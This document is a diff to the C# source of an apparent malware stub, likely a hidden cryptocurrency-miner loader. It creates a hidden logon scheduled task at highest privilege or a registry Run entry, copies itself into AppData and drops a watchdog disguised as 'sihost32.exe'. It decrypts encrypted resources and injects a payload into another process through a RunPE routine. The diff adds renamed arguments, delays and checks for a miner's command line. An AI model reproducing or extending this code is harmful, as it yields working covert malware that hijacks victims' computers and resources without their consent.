@@ -29,82 +29,85 @@ public partial class Program
 {
     public static string lb = RGetString("#LIBSPATH");
     public static string bD = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\" + lb;
+#if DefInstall
+    public static string plp = PayloadPath;
+#endif
 
     public static void Main()
     {
 #if DefInstall
-        if(new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
-        {
-            try{
-                Process.Start(new ProcessStartInfo
-                {
-                    FileName = "cmd",
-                    Arguments = "/c schtasks /create /f /sc onlogon /rl highest /tn " + "\"" + Path.GetFileNameWithoutExtension(PayloadPath) + "\"" + " /tr " + "'" + "\"" + (PayloadPath) + "\"" + "' & exit",
-                    WindowStyle = ProcessWindowStyle.Hidden,
-                    CreateNoWindow = true,
-                });
-            }
-            catch(Exception ex){
-            Registry.CurrentUser.CreateSubKey(RGetString("#REGKEY")).SetValue(Path.GetFileName(PayloadPath), PayloadPath);
+        try{
+            Thread.Sleep(2 * 1000);
+            if(new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
+            {
+                try{
+                    Process.Start(new ProcessStartInfo
+                    {
+                        FileName = "cmd",
+                        Arguments = "/c schtasks /create /f /sc onlogon /rl highest /tn " + "\"" + Path.GetFileNameWithoutExtension(plp) + "\"" + " /tr " + "'" + "\"" + (plp) + "\"" + "' & exit",
+                        WindowStyle = ProcessWindowStyle.Hidden,
+                        CreateNoWindow = true
+                    });
+                }
+                catch(Exception ex){
+                Registry.CurrentUser.CreateSubKey(RGetString("#REGKEY")).SetValue(Path.GetFileName(plp), plp);
 #if DefDebug
-            MessageBox.Show(ex.ToString());
+                MessageBox.Show("M1: " + Environment.NewLine + ex.ToString());
 #endif
+                }
+            }else{
+                Registry.CurrentUser.CreateSubKey(RGetString("#REGKEY")).SetValue(Path.GetFileName(plp), plp);
             }
-        }else{
-            Registry.CurrentUser.CreateSubKey(RGetString("#REGKEY")).SetValue(Path.GetFileName(PayloadPath), PayloadPath);
+        }
+        catch(Exception ex){
+#if DefDebug
+            MessageBox.Show("M2: " +ex.ToString());
+#endif
         }
         RInstall();
 #endif
-        RInitialize();
+        try
+        {
+            RInitialize();
+        }
+        catch (Exception ex)
+        {
+#if DefDebug
+            MessageBox.Show("M0: " +ex.ToString());
+#endif
+        }
     }
 
 #if DefInstall
     public static void RInstall()
     {
         Thread.Sleep(2 * 1000);
-        try
+        if (Process.GetCurrentProcess().MainModule.FileName != plp)
         {
-            if (Process.GetCurrentProcess().MainModule.FileName != PayloadPath)
-            {
-                File.WriteAllBytes(PayloadPath, File.ReadAllBytes(Process.GetCurrentProcess().MainModule.FileName));
-                Thread.Sleep(2 * 1000);
-                RBaseFolder();
-                Process.Start(PayloadPath);
-                Environment.Exit(0);
-            }
-        }
-        catch(Exception ex){
-#if DefDebug
-            MessageBox.Show(ex.ToString());
-#endif
+            File.Copy(Process.GetCurrentProcess().MainModule.FileName, plp, true);
+            Thread.Sleep(5 * 1000);
+            RBaseFolder();
+            Process.Start(plp);
+            Environment.Exit(0);
         }
     }
 #endif
 
-    public static byte[] RGetTheResource(string Get_)
+    public static byte[] RGetTheResource(string rarg1)
     {
         var MyResource = new System.Resources.ResourceManager("#ParentRes", Assembly.GetExecutingAssembly());
-        return RAES_Decryptor((byte[])MyResource.GetObject(Get_));
+        return RAES_Decryptor((byte[])MyResource.GetObject(rarg1));
     }
 
-    public static string RGetString(string input)
+    public static string RGetString(string rarg1)
     {
-        return Encoding.ASCII.GetString(RAES_Decryptor(Convert.FromBase64String(input)));
+        return Encoding.ASCII.GetString(RAES_Decryptor(Convert.FromBase64String(rarg1)));
     }
 
-    public static void RRun(byte[] PL, string arg, byte[] buffer)
+    public static void RRun(byte[] rarg1, string rarg2, byte[] rarg3)
     {
         // Credits gigajew for RunPE https://github.com/gigajew/Mandark
-        try
-        {
-            Assembly.Load(PL).GetType(RGetString("#DLLSTR")).GetMethod(RGetString("#DLLOAD"), BindingFlags.Public | BindingFlags.Static).Invoke(null, new object[] { buffer, ("#InjectionDir") + @"\" + RGetString("#InjectionTarget"), arg });
-        }
-        catch (Exception ex)
-        {
-#if DefDebug
-            MessageBox.Show(ex.ToString());
-#endif
-        }
+        Assembly.Load(rarg1).GetType(RGetString("#DLLSTR")).GetMethod(RGetString("#DLLOAD"), BindingFlags.Public | BindingFlags.Static).Invoke(null, new object[] { rarg3, ("#InjectionDir") + @"\" + RGetString("#InjectionTarget"), rarg2 });
     }
 
     public static void RBaseFolder()
@@ -112,7 +115,6 @@ public partial class Program
         try
         {
             Directory.CreateDirectory(bD);
-            var DirInfo = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\" + lb.Split(new char[] { '\\' })[0]);
 
 #if DefWatchdog
             foreach (Process proc in Process.GetProcessesByName("sihost32"))
@@ -122,6 +124,8 @@ public partial class Program
 
             Thread.Sleep(3000);
             File.WriteAllBytes(bD + "sihost32.exe", RGetTheResource("#watchdog"));
+
+            Thread.Sleep(2 * 1000);
 
             if (Process.GetProcessesByName("sihost32").Length < 1)
             {
@@ -133,7 +137,7 @@ public partial class Program
         catch (Exception ex)
         {
 #if DefDebug
-            MessageBox.Show(ex.ToString());
+            MessageBox.Show("M3: " + Environment.NewLine + ex.ToString());
 #endif
         }
     }
@@ -146,13 +150,14 @@ public partial class Program
             options.Impersonation = ImpersonationLevel.Impersonate;
             var scope = new ManagementScope(@"\\" + Environment.UserDomainName + @"\root\cimv2", options);
             scope.Connect();
+
             string wmiQuery = string.Format("Select CommandLine from Win32_Process where Name='{0}'", RGetString("#InjectionTarget"));
             var query = new ObjectQuery(wmiQuery);
             var managementObjectSearcher = new ManagementObjectSearcher(scope, query);
             var managementObjectCollection = managementObjectSearcher.Get();
             foreach (ManagementObject retObject in managementObjectCollection)
             {
-                if (retObject != null && retObject["CommandLine"] != null && retObject["CommandLine"].ToString().Contains("--pool"))
+                if (retObject != null && retObject["CommandLine"] != null && retObject["CommandLine"].ToString().Contains("--cinit-find-e"))
                 {
                     return true;
                 }
@@ -161,30 +166,14 @@ public partial class Program
         catch (Exception ex)
         {
 #if DefDebug
-            MessageBox.Show(ex.ToString());
+            MessageBox.Show("M4: " + Environment.NewLine + ex.ToString());
 #endif
         }
-
         return false;
     }
 
     public static void RInitialize()
     {
-        try
-        {
-            int startDelay = 0;
-            if (int.TryParse("#STARTDELAY", out startDelay) && startDelay > 0)
-            {
-                Thread.Sleep(startDelay * 1000);
-            }
-        }
-        catch (Exception ex)
-        {
-#if DefDebug
-            MessageBox.Show(ex.ToString());
-#endif
-        }
-
         try
         {
             RBaseFolder();
@@ -220,28 +209,28 @@ public partial class Program
             catch (Exception ex)
             {
 #if DefDebug
-            MessageBox.Show(ex.ToString());
+            MessageBox.Show("M5: " + Environment.NewLine + ex.ToString());
 #endif
             }
         }
         catch (Exception ex)
         {
 #if DefDebug
-            MessageBox.Show(ex.ToString());
+            MessageBox.Show("M6: " + Environment.NewLine + ex.ToString());
 #endif
         }
     }
 
-    public static string RTruncate(string value, int maxLength)
+    public static string RTruncate(string rarg1, int rarg2)
     {
-        if (string.IsNullOrEmpty(value))
+        if (string.IsNullOrEmpty(rarg1))
         {
-            return value;
+            return rarg1;
         }
-        return value.Length > maxLength ? value.Substring(0, maxLength) : value;
+        return rarg1.Length > rarg2 ? rarg1.Substring(0, rarg2) : rarg1;
     }
 
-    public static byte[] RAES_Decryptor(byte[] input)
+    public static byte[] RAES_Decryptor(byte[] rarg1)
     {
         var initVectorBytes = Encoding.ASCII.GetBytes("#IV");
         var saltValueBytes = Encoding.ASCII.GetBytes("#SALT");
@@ -254,7 +243,7 @@ public partial class Program
         {
             using (var cStream = new CryptoStream(mStream, decryptor, CryptoStreamMode.Write))
             {
-                cStream.Write(input, 0, input.Length);
+                cStream.Write(rarg1, 0, rarg1.Length);
                 cStream.Close();
             }
 
